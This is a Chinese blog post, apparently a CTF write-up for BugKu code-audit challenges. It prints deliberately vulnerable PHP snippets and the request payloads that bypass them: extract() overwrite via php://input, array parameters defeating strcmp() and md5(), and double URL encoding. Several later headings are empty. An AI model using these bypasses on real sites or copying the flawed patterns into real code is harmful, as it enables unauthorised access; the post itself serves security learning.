---
title: BugKu-CTF-代码审计-Write-Up
date: 2018-03-09 15:30:04
tags:
 - ctf
 - wp
---

[BugkuCTF-新版](http://ctf.bugku.com/challenges)
[Bugku-旧版](http://123.206.31.85/login?next=challenges)

可以参照我的[php函数漏洞小结](http://byxs0x0.cn/2018/03/06/php-func-vul/)和[php弱类型小结](http://byxs0x0.cn/2018/03/06/php-weak-type/)

### extract变量覆盖
```php
$flag='xxx';
extract($_GET);
if(isset($shiyan))
{
  $content=trim(file_get_contents($flag));
if($shiyan==$content)
{
  echo'flag{xxx}';
}
else
{
  echo'Oh.no';
}
}
```
extract()可以覆盖变量值，因为`file_get_contents($flag)`，所以我们不能直接覆盖$flag一个值，那么可以利用php://input来获取POST数据流。在将shiyan的值覆盖与POST数据流相同即可。
```
http://120.24.86.145:9009/1.php?shiyan=1&flag=php://input
[POST DATA]
1
```

<br>

### strcmp比较字符串
```php
$flag = "flag{xxxxx}";
if (isset($_GET['a'])) {
if (strcmp($_GET['a'], $flag) == 0) //如果 str1 小于 str2 返回 < 0； 如果 str1大于 str2返回 > 0；如果两者相等，返回 0。
//比较两个字符串（区分大小写）
die('Flag: '.$flag);
else
print 'No';
}
```
在strcmp()函数中存在传入数组会返回Null，那么当我们传入数组，`Null==0`为true，那么满足条件。
`http://120.24.86.145:9009/6.php?a[]=1`
<br>

### urldecode二次编码绕过
```php
if(eregi("hackerDJ",$_GET[id])) {
  echo("not allowed!");
  exit();
}
$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == "hackerDJ")
{
  echo "Access granted!";
  echo "flag";
}
```
代码中第一个条件限制了字符串经过一次URL编码后不能是hackerDJ，但是中间有进行了了urldecode()的操作，那么我们便有机可乘，只需要进行两次url编码即可。
当发送请求的URL地址为`http://120.24.86.145:9009/10.php?id=%25%36%38%25%36%31%25%36%33%25%36%62%25%36%35%25%37%32%25%34%34%25%34%61`时，服务器接受请求后会自动的进行一次URL解码，参数会变为`%68%61%63%6b%65%72%44%4a`，并且能通过第一次验证，然后经过`urldecode()`函数在进行URL解码，`$_GET[id]==hackerDJ`，那么条件就成立，得到flag。
<br>

### md5()函数
```php
error_reporting(0);
$flag = 'flag{test}';
if (isset($_GET['username']) and isset($_GET['password'])) {
  if ($_GET['username'] == $_GET['password'])
    print 'Your password can not be your username.';
  else if (md5($_GET['username']) === md5($_GET['password']))
    die('Flag: '.$flag);
  else
    print 'Invalid password';
}
```

```php
http://120.24.86.145:9009/18.php?username[]=3&password[]=1
var_dump($_GET['username']) //array(1) { [0]=> string(1) "3" }
var_dump($_GET['password']) //array(1) { [0]=> string(1) "1" }

数组之间比较，只要两个数组的数量、KEY、VALUS都相同遍相等，顺序不同没关系。
$_GET['username'] == $_GET['password'] //条件不满足

在利用md5()传入数组会返回Null的特性
md5($_GET['username']) === md5($_GET['password'])
Null === Null //满足

得到flag
```
<br>

### 数组返回NULL绕过

<br>

### sha()函数比较绕过

<br>

### 十六进制与数字比较

<br>

### ereg正则%00截断

<br>

### strpos数组绕过

<br>
